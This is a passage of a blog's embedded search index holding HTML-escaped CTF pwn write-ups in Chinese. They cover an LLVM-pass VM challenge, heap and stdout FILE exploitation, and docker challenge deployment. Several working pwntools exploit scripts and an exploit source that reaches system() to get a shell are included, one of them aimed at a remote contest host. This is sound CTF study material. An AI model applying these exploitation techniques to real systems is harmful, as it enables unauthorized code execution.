    io.sendline(str(size).encode())
    io.recvuntil(b&amp;quot;content: &amp;quot;)
    io.sendline(content)


backdoor = 0x80489CE
add()
add()
show(0)
io.recvuntil(&amp;quot;0x&amp;quot;)
sys = int(io.recv(7),16)
gdb.attach(io)
edit(0,40,b&#39;a&#39;*20 + p32(backdoor) + p32(sys + 0x1c))
print(&amp;quot;sys = &amp;quot;,hex(sys))

edit(1,40,b&#39;a&#39;*24)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ciscnæš¨é•¿åŸæ¯</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/llvm-pwn/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1&#34;&gt;https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/#toc-heading-1&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;ç¯å¢ƒé…ç½®&#34;&gt;ç¯å¢ƒé…ç½®&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sudo apt install clang-12 clang-8 llvm-12 llvm-8&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;ç¼–è¯‘&#34;&gt;ç¼–è¯‘&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;clang-12 -emit-llvm -S exp.cpp -o exp.ll&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;è¿è¡Œ&#34;&gt;è¿è¡Œ&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;opt-12 -load ./xxx.so -æ ‡è¯†ç¬¦ ./exp.ll&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;cå‡½æ•°åä¿®é¥°è§„åˆ™&#34;&gt;c++å‡½æ•°åä¿®é¥°è§„åˆ™&lt;/h1&gt;
&lt;p&gt;ä½¿ç”¨gccæˆ–clangç¼–è¯‘c++æ—¶ä¼šç»è¿‡åç§°ä¿®é¥°çš„è¿‡ç¨‹ä»è€Œæ”¹å˜å‡½æ•°åï¼Œä¿®é¥°åçš„åç§°é€šå¸¸åŒ…æ‹¬ï¼š&lt;br&gt;
_Zï¼šä¿®é¥°åç§°çš„å¼€å§‹&lt;/p&gt;
&lt;p&gt;Nï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå‡½æ•°æˆ–é™æ€æˆå‘˜å‡½æ•°&lt;/p&gt;
&lt;p&gt;æ•°å­—ï¼šè¡¨ç¤ºå‡½æ•°åç§°çš„é•¿åº¦&lt;/p&gt;
&lt;p&gt;ç±»åå’Œå‡½æ•°åï¼šç»è¿‡ç¼–ç çš„ç±»åå’Œå‡½æ•°å&lt;/p&gt;
&lt;p&gt;Eï¼šå‚æ•°åˆ—è¡¨çš„å¼€å§‹&lt;/p&gt;
&lt;p&gt;å‚æ•°ç±»å‹ï¼šé€šè¿‡ä¸åŒçš„å­—æ¯æŒ‰é¡ºåºè¡¨ç¤ºå‚æ•°ç±»å‹&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;å­—æ¯&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;å‚æ•°ç±»å‹&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;i&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;int&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;j&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;unsigned int&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;l&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;x&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;long long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;m&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;unsigned long&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;c&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;char&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;h&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;unsigned char&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;b&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;bool&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ç»“å°¾ï¼šåŒ…å«é¢å¤–ä¿¡æ¯å¦‚è¿”å›ç±»å‹&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;ä¾‹å¦‚_ZN4edoc4addiEhiiè¡¨ç¤ºåœ¨edocç±»ä¸­çš„å‡½æ•°åé•¿åº¦ä¸º4çš„å‡½æ•°addiï¼Œå®ƒçš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«æ˜¯unsigned charã€intã€intç±»å‹&lt;/p&gt;
&lt;h1 id=&#34;è§£é¢˜&#34;&gt;è§£é¢˜&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1733843158994.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é¢˜ç›®ç»™å‡ºäº†codeVM.soå’Œopt-12ä»¥åŠld-linux-x86-64.so.2å’Œlibc.so.6ï¼Œéœ€è¦é€†å‘åˆ†æçš„æ˜¯code.soæ–‡ä»¶ï¼ŒåŠ¨æ€è°ƒè¯•æ—¶ç”¨çš„æ˜¯opt-12&lt;/p&gt;
&lt;h1 id=&#34;åŠ¨æ€è°ƒè¯•&#34;&gt;åŠ¨æ€è°ƒè¯•&lt;/h1&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;gdb opt-12&lt;/code&gt;è¿›è¡Œè°ƒè¯•ï¼Œå¹¶ä¸”é€šè¿‡&lt;code&gt;set args -load ./codeVM.so -Co00o0oOd3 ./exp.ll -f&lt;/code&gt;å¯¼å…¥å‚æ•°ï¼Œåœ¨&lt;code&gt;main&lt;/code&gt;å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œè‡³æ‰€æœ‰llvm::initializeå‰ç¼€çš„åˆå§‹åŒ–å‡½æ•°ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œ&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843559366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ä½¿ç”¨&lt;code&gt;vmmap&lt;/code&gt;è·å–xxx.soçš„åŸºå€ï¼Œé€šè¿‡IDAä¸­çš„åç§»ä¸‹æ–­ç‚¹è¿›è¡Œè¿›ä¸€æ­¥è°ƒè¯•ï¼ˆå¦‚æœæ²¡æœ‰åŸºå€è¯´æ˜åˆå§‹èƒ¡å‡½æ•°è¿˜æ²¡è¿è¡Œå®Œ&lt;br&gt;
å…¶ä¸­Co00o0oOd3æ˜¯åœ¨_cxx_global_var_init_17å‡½æ•°ä¸­&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843473097.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨&lt;code&gt;_data_rel_ro&lt;/code&gt;æ®µå¯ä»¥æ‰¾åˆ°ç¨‹åºå…¥å£&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843735739.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843758487.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ˜“æ¨æ–­å‡º&lt;br&gt;
&lt;code&gt;llvm::Value::getName();&lt;/code&gt;ç”¨äºè·å–å‡½æ•°å&lt;br&gt;
&lt;code&gt;llvm::operator==(Name, v8, v6[0], v6[1]);&lt;/code&gt;ç”¨äºæ¯”è¾ƒå‡½æ•°å&lt;br&gt;
æ‰€ä»¥å¯ä»¥é€šè¿‡åœ¨&lt;code&gt;llvm::operator==(Name, v8, v6[0], v6[1]);&lt;/code&gt;å¤„ä¸‹æ–­ç‚¹æ¥æ‰¾å‡ºç¨‹åºå‡½æ•°å&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733843967112.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œè·å¾—codeVM.soçš„åŸºå€ï¼Œç„¶ååŠ ä¸Š&lt;code&gt;llvm::operator==(Name, v8, v6[0], v6[1]);&lt;/code&gt;åœ¨codeVM.soä¸­çš„åç§»å³å¯&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733844073046.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œçš„æµ‹è¯•å‡½æ•°æ˜¯testfunctionç»è¿‡å‡½æ•°åä¿®é¥°æˆä¸º_Z12testfunctionvï¼Œå¯ä»¥çœ‹å‡ºç¨‹åºå…¥å£å‡½æ•°éœ€è¦è¢«ä¿®é¥°ä¸º_Z10c0deVmMainvæ‰€ä»¥å¾—åˆ°ï¼Œç¨‹åºå…¥å£å‡½æ•°ååº”è¯¥æ˜¯c0deVmMain&lt;/p&gt;
&lt;p&gt;è¿›å…¥vmrunå‡½æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__int64 __fastcall `anonymous namespace&#39;::c0oo0o0Ode::vmRun(
        _anonymous_namespace_::c0oo0o0Ode *this,
        llvm::Function *a2)
{
  __int64 v2; // rax
  __int64 result; // rax
  llvm::BasicBlock *v4; // rax
  llvm::BasicBlock *v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // [rsp+10h] [rbp-40h] BYREF
  __int64 v15; // [rsp+18h] [rbp-38h] BYREF
  __int64 v16; // [rsp+20h] [rbp-30h] BYREF
  char v17[8]; // [rsp+28h] [rbp-28h] BYREF
  __int64 v18; // [rsp+30h] [rbp-20h] BYREF
  char v19[8]; // [rsp+38h] [rbp-18h] BYREF
  llvm::Function *v20; // [rsp+40h] [rbp-10h]
  _anonymous_namespace_::c0oo0o0Ode *v21; // [rsp+48h] [rbp-8h]

  v21 = this;
  v20 = a2;
  v2 = llvm::errs(this);
  llvm::raw_ostream::operator&amp;lt;&amp;lt;(v2, &amp;quot;Talk is cheap. Show me the code!\n&amp;quot;);
  v18 = llvm::Function::end(a2);
  llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::ilist_iterator&amp;lt;false&amp;gt;(
    v19,
    &amp;amp;v18,
    0LL);
  v16 = llvm::Function::begin(v20);
  llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::ilist_iterator&amp;lt;false&amp;gt;(
    v17,
    &amp;amp;v16,
    0LL);
  while ( 1 )
  {
    result = llvm::operator!=(v17, v19);
    if ( (result &amp;amp; 1) == 0 )
      break;
    v4 = (llvm::BasicBlock *)llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::operator-&amp;gt;(v17);
    v15 = llvm::BasicBlock::begin(v4);
    v5 = (llvm::BasicBlock *)llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::operator-&amp;gt;(v17);
    v14 = llvm::BasicBlock::end(v5);
    while ( (llvm::operator!=(&amp;amp;v15, &amp;amp;v14) &amp;amp; 1) != 0 )
    {
      v6 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 0LL);
      if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v6) &amp;amp; 1) != 0 )
      {
        `anonymous namespace&#39;::c0oo0o0Ode::op1(this, &amp;amp;v15);
      }
      else
      {
        v7 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 1LL);
        if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v7) &amp;amp; 1) != 0 )
        {
          `anonymous namespace&#39;::c0oo0o0Ode::op2(this, &amp;amp;v15);
        }
        else
        {
          v8 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 2LL);
          if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v8) &amp;amp; 1) != 0 )
          {
            `anonymous namespace&#39;::c0oo0o0Ode::op3(this, &amp;amp;v15);
          }
          else
          {
            v9 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 3LL);
            if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v9) &amp;amp; 1) != 0 )
            {
              `anonymous namespace&#39;::c0oo0o0Ode::op4(this, &amp;amp;v15);
            }
            else
            {
              v10 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 4LL);
              if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v10) &amp;amp; 1) != 0 )
              {
                `anonymous namespace&#39;::c0oo0o0Ode::op5(this, &amp;amp;v15);
              }
              else
              {
                v11 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 5LL);
                if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v11) &amp;amp; 1) != 0 )
                {
                  `anonymous namespace&#39;::c0oo0o0Ode::op6(this, &amp;amp;v15);
                }
                else
                {
                  v12 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 6LL);
                  if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v12) &amp;amp; 1) != 0 )
                  {
                    `anonymous namespace&#39;::c0oo0o0Ode::op7(this, &amp;amp;v15);
                  }
                  else
                  {
                    v13 = std::vector&amp;lt;std::string&amp;gt;::operator[](&amp;amp;`anonymous namespace&#39;::ops[abi:cxx11], 7LL);
                    if ( (`anonymous namespace&#39;::c0oo0o0Ode::isValidOp(this, &amp;amp;v15, v13) &amp;amp; 1) != 0 )
                      `anonymous namespace&#39;::c0oo0o0Ode::op8(this, &amp;amp;v15);
                  }
                }
              }
            }
          }
        }
      }
      llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::Instruction,false,false,void&amp;gt;,false,true&amp;gt;::operator++(&amp;amp;v15);
    }
    llvm::ilist_iterator&amp;lt;llvm::ilist_detail::node_options&amp;lt;llvm::BasicBlock,false,false,void&amp;gt;,false,true&amp;gt;::operator++(v17);
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥çœ‹å‡ºæ˜¯op1-8çš„æŒ‡ä»¤ï¼Œå‰é¢ä½¿ç”¨äº†&lt;code&gt;isValidOp&lt;/code&gt;å‡½æ•°æ¥åˆ¤æ–­&lt;br&gt;
è¿›å…¥åå‘ç°è¯¥å‡½æ•°å†…éƒ¨ä¹Ÿæ˜¯é€šè¿‡&lt;code&gt;getName&lt;/code&gt;è¯»å–å‡½æ•°å&lt;code&gt;operator==&lt;/code&gt;æ¯”è¾ƒå‡½æ•°åæ¥å®ç°çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ç›¸åŒæ–¹æ³•æ‰¾å‡ºop1-8æ‰€ç”¨åˆ°çš„å‡½æ•°å&lt;br&gt;
è¿™é‡Œä»¥op1ä¸ºä¾‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733844522717.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°éœ€è¦è¢«ä¿®é¥°ä¸º&lt;code&gt;_ZN4edoc4addiEhii&lt;/code&gt;(å…·ä½“è§£é‡Šè§C++å‡½æ•°åä¿®é¥°è§„åˆ™)ï¼Œå¯ä»¥æ¨æ–­å‡ºè¯¥å‡½æ•°æ˜¯ä½äºedocç±»ä¸‹çš„addiå‡½æ•°ï¼Œå‚æ•°ç±»å‹æ˜¯unsigned charã€intã€intï¼Œæ›¿ä»–opåŒç†å¾—åˆ°äº¤äº’ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class edoc {
public:
    void addi(unsigned char x, int y, int z) {}  
    void chgr(unsigned char x, int y) {}                  
    void sftr(unsigned char x, bool y, unsigned char z) {}       
    void borr(unsigned char x, unsigned char y, unsigned char z) {} 
    void movr(unsigned char x, unsigned char y) {}                 
    void save(unsigned char x, unsigned int  y) {}              
    void load(unsigned char x, unsigned int y) {}              
    void runc(unsigned char x, unsigned int  y) {}                
};

edoc obj;

int c0deVmMain() {
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;é€†å‘å„ä¸ªopcode&#34;&gt;é€†å‘å„ä¸ªopcode&lt;/h1&gt;
&lt;p&gt;ä»¥op1ä¸ºä¾‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1733844761080.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;code&gt;llvm::CallBase::getNumArgOperands(v13)&lt;/code&gt;ç”¨äºè·å–å‚æ•°ä¸ªæ•°&lt;br&gt;
&lt;code&gt;ArgOperand = (llvm::Value *)llvm::CallBase::getArgOperand(v13, i);&lt;/code&gt;ç±»ä¼¼åˆ›å»ºå‚æ•°å¯¹è±¡&lt;br&gt;
&lt;code&gt;llvm::ConstantInt::getZExtValue(v8);&lt;/code&gt;è·å–å‚æ•°çš„å€¼&lt;br&gt;
&lt;code&gt;*(_QWORD *)std::vector&amp;lt;unsigned long&amp;gt;::operator[](&amp;amp;secret::regs, ZExtValue) = v6;&lt;/code&gt;ç›¸å½“äºregs[ZExtValue]=v6&lt;/p&gt;
&lt;h2 id=&#34;å‚æ•°ä½ç½®&#34;&gt;å‚æ•°ä½ç½®&lt;/h2&gt;
&lt;p&gt;ä¸»è¦å…³æ³¨&lt;code&gt;getZExtValue&lt;/code&gt;å’Œ&lt;code&gt;getBoolValue&lt;/code&gt;ä¹‹ç±»è·å–å‚æ•°çš„å‡½æ•°&lt;br&gt;
è¿˜åŸå„ä¸ªopåŠŸèƒ½å¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&amp;gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&amp;gt; regs[reg] if |op| &amp;lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &amp;lt;&amp;lt; bits if is_left else regs[reg] &amp;gt;&amp;gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&amp;gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&amp;gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&amp;gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&amp;gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class edoc {
    public:
        void addi(unsigned char reg, int op1, int op2);
        // op1 + op2 -&amp;gt; regs[reg]
        void chgr(unsigned char reg, int op);
        // regs[reg] + op -&amp;gt; regs[reg] if |op| &amp;lt; 0x1000 and only once
        void sftr(unsigned char reg, bool is_left, unsigned char bits);
        // regs[reg] &amp;lt;&amp;lt; bits if is_left else regs[reg] &amp;gt;&amp;gt; bits
        void borr(unsigned char reg1, unsigned char reg2, unsigned char reg3);
        // regs[reg2] | regs[reg3] -&amp;gt; regs[reg1]
        void movr(unsigned char reg1, unsigned char reg2);
        // regs[reg2] -&amp;gt; regs[reg1]
        void save(unsigned char reg, unsigned offset);
        // regs[reg] -&amp;gt; *(regs[6] + offset)
        void load(unsigned char reg, unsigned offset);
        // *(regs[6] + offset) -&amp;gt; regs[reg]
        void runc(unsigned char reg, unsigned offset);
        // *(regs[6] + offset)(regs[reg])
 };

edoc obj;

void testfunction(){}

int c0deVmMain() {
        obj.addi(0, 0x442000, 0);
        obj.movr(6, 0);
        obj.addi(1, 0x443000, 0);		
        obj.movr(7, 1);					//regs[7] = regs[6] + 0x1000
        obj.load(2, 0xad8);    			//load(0x4420xad8): regs[2] = getenv_addr

        obj.sftr(2, 0, 16);                     
        obj.sftr(2, 1, 12);
        obj.addi(5, 0x400, 0);
        obj.borr(2, 2, 5);
        obj.chgr(2, 0xc00);
        obj.sftr(2, 1, 4);				//Sets the lower two bytes to null and increments the third last byte by 1
        obj.addi(4, 0xd70, 0);
        obj.borr(2, 2, 4);				//clear and add
    
        obj.addi(4, 0x3024, 0);
        obj.save(4, 0x1000);			//save $0

        obj.save(2, 0xb00);				//save system

        obj.runc(1, 0xb00);				//system(&#39;$0&#39;)
        return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çˆ†ç ´è„šæœ¬&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
import base64

context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

li = lambda x : print(&#39;\x1b[01;38;5;214m&#39; + str(x) + &#39;\x1b[0m&#39;)
ll = lambda x : print(&#39;\x1b[01;38;5;1m&#39; + str(x) + &#39;\x1b[0m&#39;)

context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

with open(&amp;quot;exp.ll&amp;quot;, &amp;quot;rb&amp;quot;) as file:
    p = base64.b64encode(file.read())
p += b&#39;\nEOF\n&#39;

rnd = 0
while True:
    try:
        r = remote(&#39;127.0.0.1&#39;, 7090)
        rnd += 1
        li(&#39;the &#39; + str(rnd) + &#39; round&#39;)
        r.recvuntil(b&#39;(EOF to stop):\n&#39;)

        r.send(p)

        r.sendline(&#39;cat flag&#39;)
        for i in range(4):
            s = r.recvline()
        if b&#39;flag&#39; in s:
            li(s)
            break
        else:
            continue

    except EOFError:
        r.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">LLVM-pwn</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ji-yu-xinetd-de-pwn-ti-mu-bu-shu/"" data-c="
          &lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Myon5/article/details/131763593&#34;&gt;https://blog.csdn.net/Myon5/article/details/131763593&lt;/a&gt;&lt;br&gt;
1.ä¿®æ”¹ctf.xinetdå’ŒDockerfileçš„portä¸º80&lt;br&gt;
2.æ­å»ºé•œåƒ&lt;code&gt;docker build -t &amp;quot;é•œåƒå&amp;quot; .&lt;/code&gt;&lt;br&gt;
3.è¿è¡Œé•œåƒ&lt;code&gt;docker run -d -p &amp;quot;0.0.0.0:8090:80&amp;quot; -h &amp;quot;é•œåƒå&amp;quot; --name=&amp;quot;é•œåƒå&amp;quot; é•œåƒå&lt;/code&gt;&lt;br&gt;
4.ç›´æ¥&lt;code&gt;nc 127.0.0.1 8090&lt;/code&gt;å³å¯è¿æ¥æˆåŠŸ&lt;br&gt;
&lt;code&gt;docker cp flag å®¹å™¨ID:/home/ctf&lt;/code&gt;å¯æ›¿æ¢flag&lt;/p&gt;
">åŸºäºxinetdçš„pwné¢˜ç›®éƒ¨ç½²</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/shu-dao-shan/"" data-c="
          &lt;h1 id=&#34;ç¬¬ä¸€é“&#34;&gt;ç¬¬ä¸€é“&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1731925415445.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°åªè¦çŸ¥é“libcåœ°å€ç„¶åå†é¢„æµ‹ä¸€ä¸‹ä¼ªéšæœºæ•°å³å¯æ‹¿åˆ°sellï¼Œquestion_liståœ¨bssæ®µä¸Šï¼Œæ•°ç»„ä¸‹è¡¨æº¢å‡ºå³å¯æ”¹å†™stdoutç»“æ„ä½“ï¼Œæ³„éœ²å‡ºæ¥libcåœ°å€ï¼Œç„¶åå†éšä¾¿é¢„æµ‹ä¸€ä¸‹ä¼ªéšæœºæ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
import ctypes
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
# åŠ è½½åŠ¨æ€é“¾æ¥åº“
lib = ctypes.CDLL(&#39;./1.so&#39;)
lib.random_number.restype = ctypes.c_int
# è°ƒç”¨Cè¯­è¨€çš„set_seedå‡½æ•°
lib.set_seed()
# è°ƒç”¨Cè¯­è¨€çš„random_numberå‡½æ•°
result = lib.random_number()
rand = result % 9011
print(rand)

#p = process(&amp;quot;./pwn&amp;quot;)
p = remote(&#39;gamebox.yunyansec.com&#39;,25683)

p.sendlineafter(&amp;quot;Which question do you want to answer?\n&amp;quot;,b&#39;-8&#39;)

payload = p64(0xfbad1800) + p64(0)*3 + b&#39;\x00&#39;
p.sendlineafter(&amp;quot;Then you can input your answer.&amp;quot;,payload)
p.recv(1)
p.recv(8)
libc = u64(p.recv(8)) - 2017664
print(&amp;quot;libc = &amp;quot;,hex(libc))
puts = libc + 0x000000000084420
pause()
p.sendlineafter(&amp;quot;Which question do you want to answer?&amp;quot;,b&#39;2&#39;)
p.sendlineafter(&amp;quot;Then you can input your answer.&amp;quot;,b&#39;2&#39;)
p.sendlineafter(&amp;quot;Which question do you want to answer?&amp;quot;,b&#39;3&#39;)
p.sendlineafter(&amp;quot;Then you can input your answer.&amp;quot;,p64(puts + rand))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ç¬¬äºŒé“noleak&#34;&gt;ç¬¬äºŒé“(noleak??)&lt;/h1&gt;
&lt;p&gt;2.23çš„libc,ç»™äº†åé—¨å‡½æ•°ï¼Œç¨‹åºå¼€å¤´ç»™äº†å †åœ°å€ï¼Œåªæœ‰addå’ŒdeleteåŠŸèƒ½ä½†æ˜¯åŸºæœ¬æ²¡æœ‰é™åˆ¶ï¼Œå­˜åœ¨uafï¼Œç‰ˆæœ¬å¾ˆä½ï¼Œç›´æ¥æ‰“fast attackå³å¯ï¼Œä½†æ˜¯æ²¡æœ‰showåŠŸèƒ½ï¼Œæ‰€ä»¥éœ€è¦åŠ«æŒstdoutç»“æ„ä½“ï¼Œè¦è®©libcçš„åœ°å€å‡ºç°åœ¨fast binä¸­ï¼Œå…·ä½“åšæ³•æ˜¯å…ˆåˆ›å»ºä¸€ä¸ªå¤§çš„unsorted binï¼Œç„¶åé€šè¿‡uafå®ç°å †è¦†ç›–ï¼Œå¤§æ¦‚å¸ƒç½®æˆè¿™ä¸ªæ ·å­&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1731926053038.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç„¶ååˆ†é…unsortedbinå°±å¯ä»¥ï¼Œå†ä¿®æ”¹ä½ä½è¦†ç›–å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./vuln&#39;)
e = ELF(&#39;./vuln&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22æ‰“æœ¬åœ°

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;&amp;gt;&amp;gt;&amp;gt; &#39;)
    r.sendline(str(choice).encode())


def add(idx,size,content):
    cmd(1)
    r.recvuntil(b&#39;idx???&#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;size???&#39;)
    r.sendline(str(size).encode())
    r.recvuntil(b&#39;content???&#39;)
    r.send(content)


def delete(idx):
    cmd(2)
    r.recvuntil(b&#39;idx???&#39;)
    r.sendline(str(idx).encode())

r.recvuntil(&amp;quot;0x&amp;quot;)
